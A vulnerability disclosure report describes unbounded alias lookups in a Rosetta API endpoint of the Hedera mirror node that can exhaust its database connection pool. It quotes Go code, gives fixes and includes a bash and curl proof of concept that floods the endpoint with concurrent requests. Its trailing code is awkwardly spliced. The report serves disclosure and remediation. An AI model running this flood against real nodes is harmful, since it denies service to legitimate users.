### Title
Unbounded Alias List in `/construction/metadata` Causes Sequential DB Query Amplification Leading to Connection Pool Exhaustion

### Summary
The `resolveAccountAliases()` function in `rosetta/app/services/construction_service.go` iterates over a caller-supplied comma-separated string of account aliases with no upper bound on count, issuing one synchronous database query per alias via `accountRepo.GetAccountId()`. An unauthenticated attacker can submit arbitrarily large alias lists in concurrent requests, holding DB connections for extended periods and exhausting the pool (default `MaxOpenConnections: 100`), denying service to all legitimate balance queries and transaction submissions.

### Finding Description

**Exact code path:**

`ConstructionMetadata()` (line 159) calls `resolveAccountAliases()` unconditionally when `optionKeyAccountAliases` is present in the request options:

```go
// construction_service.go:159
if resolved, rErr := c.resolveAccountAliases(ctx, options); rErr != nil {
```

Inside `resolveAccountAliases()` (lines 574–586), the function splits the user-supplied string on commas and issues one DB query per element with no count cap:

```go
var accountMap []string
for accountAlias := range strings.SplitSeq(accountAliases, ",") {
    accountId, err := types.NewAccountIdFromString(accountAlias, c.systemShard, c.systemRealm)
    if err != nil {
        return emptyResult, errors.ErrInvalidAccount
    }
    found, rErr := c.accountRepo.GetAccountId(ctx, accountId)   // one DB round-trip per alias
    if rErr != nil {
        return emptyResult, rErr
    }
    accountMap = append(accountMap, fmt.Sprintf("%s:%s", accountAlias, found))
}
```

Each `GetAccountId()` call (persistence/account.go lines 138–159) opens a GORM session against the pool and executes a `SELECT` against the `entity` table when the alias is in alias format:

```go
db, cancel := ar.dbClient.GetDbWithContext(ctx)
defer cancel()
// ...
db.Raw(selectCurrentCryptoEntityByAlias, sql.Named("alias", accountId.GetAlias())).First(&entity)
```

The DB pool is configured via `sqlDb.SetMaxOpenConns(dbConfig.Pool.MaxOpenConnections)` (db/db.go line 33), defaulting to **100** open connections (documented default).

**Root cause:** No maximum alias count is enforced before the loop begins. The only early exits are: (a) `IsOnline()` check (irrelevant for online mode), (b) type assertion failure, and (c) per-alias parse error — none of which bound the iteration count.

**Why existing checks fail:**

- The Traefik `inFlightReq: amount: 5` and `rateLimit: average: 10` middleware are **opt-in** (`middleware: false` is the default in `charts/hedera-mirror-rosetta/values.yaml` line 95) and are not enforced at the application layer.
- There is no `http.MaxBytesReader` or body-size limit on the HTTP server (main.go lines 220–227), so arbitrarily large JSON bodies are accepted.
- The HTTP `WriteTimeout` of 10 s (10,000,000,000 ns) provides a ceiling per connection, but with fast individual queries (~1 ms each) an attacker can pack ~10,000 alias lookups into a single request before the timeout fires — and can do so across many concurrent connections.
- The `statementTimeout` of 20 s applies per individual SQL statement, not to the aggregate request processing time.

### Impact Explanation

The DB pool is shared across all Rosetta API operations (account balance queries, block queries, transaction submissions). Exhausting the 100-connection pool causes every subsequent DB-dependent request to block waiting for a connection or fail immediately, resulting in a complete denial of service for the Rosetta API. Because the `/construction/metadata` endpoint is publicly reachable (no authentication is required by the Rosetta specification or this implementation), the attacker requires no credentials. The impact is high: fund-related operations (balance checks, transaction construction) become unavailable for the duration of the attack.

### Likelihood Explanation

The endpoint is unauthenticated and publicly documented as part of the Rosetta Construction API. The attack requires only the ability to send HTTP POST requests with a crafted JSON body — no special knowledge, tokens, or on-chain state is needed. The attacker can sustain the attack by continuously sending new requests as old ones time out. Even with the optional Traefik `inFlightReq` middleware enabled (5 concurrent requests per IP), rotating across a small number of source IPs trivially bypasses the per-IP limit. The attack is therefore highly repeatable and requires minimal resources.

### Recommendation

1. **Enforce an alias count limit** at the start of `resolveAccountAliases()`:
   ```go
   const maxAccountAliases = 10  // or a configurable value
   aliases := strings.Split(accountAliases, ",")
   if len(aliases) > maxAccountAliases {
       return emptyResult, errors.ErrInvalidOptions
   }
   ```
2. **Enforce a request body size limit** in `main.go` using `http.MaxBytesReader` on the request body before routing.
3. **Enable application-level rate limiting** unconditionally rather than relying on optional Traefik middleware.
4. **Consider batching** the alias lookups into a single `IN (...)` query rather than N sequential round-trips, which also eliminates the amplification factor.

### Proof of Concept

**Preconditions:** Rosetta node running in online mode, no Traefik middleware deployed (default).

**Step 1 – Generate a large alias list.** Ed25519 public key aliases are accepted. Generate N valid alias strings (e.g., base64-encoded 32-byte public keys in the format the SDK accepts).

**Step 2 – Craft the request:**
```bash
# Build a comma-separated list of 5000 valid alias strings
ALIASES=$(python3 -c "
import base64, os
print(','.join('0.0.' + base64.b64encode(os.urandom(32)).decode() for _ in range(5000)))
")

curl -s -X POST http://<rosetta-host>:5700/construction/metadata \
  -H 'Content-Type: application/json' \
  -d "{
    \"network_identifier\": {\"blockchain\": \"Hedera\", \"network\": \"mainnet\"},
    \"options\": {
      \"operation_type\": \"CRYPTOTRANSFER\",
      \"account_aliases\": \"$ALIASES\"
    }
  }" &
```

**Step 3 – Flood with concurrent requests:**
```bash
for i in $(seq 1 120); do
  # repeat the curl above in background
  <same curl command> &
done
wait
```

**Step 4 – Observe:** Legitimate requests to `/account/balance` or `/block` begin returning DB errors or hanging indefinitely as the 100-connection pool is saturated. func (c *constructionAPIService) resolveAccountAliases(
	ctx context.Context,
	options map[string]any,
) (emptyResult string, nilErr *rTypes.Error) {
	if options[optionKeyAccountAliases] == nil {
		return
	}

	if !c.BaseService.IsOnline() {
		return emptyResult, errors.ErrEndpointNotSupportedInOfflineMode
	}

	accountAliases, ok := options[optionKeyAccountAliases].(string)
	if !ok {
		return emptyResult, errors.ErrInvalidOptions
	}

	var accountMap []string
	for accountAlias := range strings.SplitSeq(accountAliases, ",") {
		accountId, err := types.NewAccountIdFromString(accountAlias, c.systemShard, c.systemRealm)
		if err != nil {
			return emptyResult, errors.ErrInvalidAccount
		}

		found, rErr := c.accountRepo.GetAccountId(ctx, accountId)
		if rErr != nil {
			return emptyResult, rErr
		}
		accountMap = append(accountMap, fmt.Sprintf("%s:%s", accountAlias, found))
	}

	return strings.Join(accountMap, ","), nilErr
}
```

func (ar *accountRepository) GetAccountId(ctx context.Context, accountId types.AccountId) (
	zero types.AccountId,
	_ *rTypes.Error,
) {
	if !accountId.HasAlias() {
		return accountId, nil
	}

	db, cancel := ar.dbClient.GetDbWithContext(ctx)
	defer cancel()

	var entity domain.Entity
	if err := db.Raw(selectCurrentCryptoEntityByAlias, sql.Named("alias", accountId.GetAlias())).First(&entity).Error; err != nil {
		if errors.Is(err, gorm.ErrRecordNotFound) {
			return zero, hErrors.ErrAccountNotFound
		}

		return zero, hErrors.ErrDatabaseError
	}

	return types.NewAccountIdFromEntityId(entity.Id), nil
}
```
